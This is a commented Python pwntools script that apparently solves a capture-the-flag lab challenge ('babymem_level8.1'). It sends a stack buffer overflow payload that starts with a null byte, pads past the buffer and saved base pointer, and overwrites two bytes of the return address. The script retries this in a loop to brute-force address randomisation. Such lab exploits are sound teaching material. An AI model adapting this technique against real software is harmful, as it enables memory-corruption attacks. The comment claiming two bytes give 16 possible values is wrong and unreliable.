# Import necessary module from the pwntools library
from pwn import *

# Initialize a flag to track whether the desired condition is met
found = False

# Since we have to bruteforce 2 bytes -> 16 possible values
# we iterate 16/2 times  = 8
for x in range(8):
    
    # If the desired condition is already found, break out of the loop
    if found:
        break

    # Create an ELF object representing the binary file
    elf = ELF('/challenge/babymem_level8.1')

    # Start a new process of the binary
    io = elf.process()

    # Receive data from the process until a specified string is encountered
    io.recvuntil(': ')

    # Define sizes for different parts of the payload
    ret_size = 8
    RBP_size = 8
    least_significant_size = 2
    null_byte_size = 1

    # Define a null byte
    null_byte = b'\x00'

    # Initialize RBP (base pointer) value just for calculation purpose
    RBP = 0

    # Starting address of the buffer
    buff_start = RBP - 0x60

    # Calculate the size of the payload as
    #|Buff start| ---overflow data--| ---overflow rbp--| change only 2 bytes of RET addr|
    payload_size = abs(buff_start - RBP) + RBP_size + least_significant_size

    # Send the payload size to the process
    io.sendline(f'{payload_size}'.encode())

    # Receive data from the process until '!' is encountered
    io.recvuntil('!')             

    # Define the least significant bytes of the return address that we are bruteforcing
    least_significant_byte_ret = '20 1f'

    # Construct the payload
    PAYLOAD = null_byte + b'A' * (payload_size - least_significant_size - null_byte_size)
    PAYLOAD += bytes(bytearray.fromhex(least_significant_byte_ret))

    # Send the payload to the process
    io.sendline(PAYLOAD)

    # Receive all output from the process and decode it
    output = io.recvall().decode()

    # Check if the output contains the string "You win!"
    if "You win!" in output:
        # If so, set the flag to True and print the output
        found = True
        print(output)
